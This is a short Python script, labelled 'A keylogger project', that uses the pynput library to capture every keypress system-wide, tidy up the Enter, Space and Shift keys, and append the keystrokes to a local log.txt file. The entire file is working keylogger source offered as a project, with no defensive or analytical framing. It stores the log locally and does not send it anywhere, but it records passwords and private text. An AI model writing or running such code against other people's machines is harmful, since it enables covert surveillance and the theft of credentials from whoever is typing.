# H3avren@py
# A keylogger project

from pynput.keyboard import Listener

def write_to_file(key):
    letter= str(key).replace("'","")
    if(letter=="Key.enter"):
        letter = "\n"
    elif(letter=="Key.space"):
        letter = " "
    elif(letter.find("Key.shift")!= -1):
        if(letter.find("Key.shift_r")!= -1):
            letter = letter.replace("Key.shift_r","")
        else:
            letter = letter.replace("Key.shift","")
    with open("log.txt","a") as fileHead:
        fileHead.write(letter)


with Listener(on_press = write_to_file) as listeningHead:
    listeningHead.join()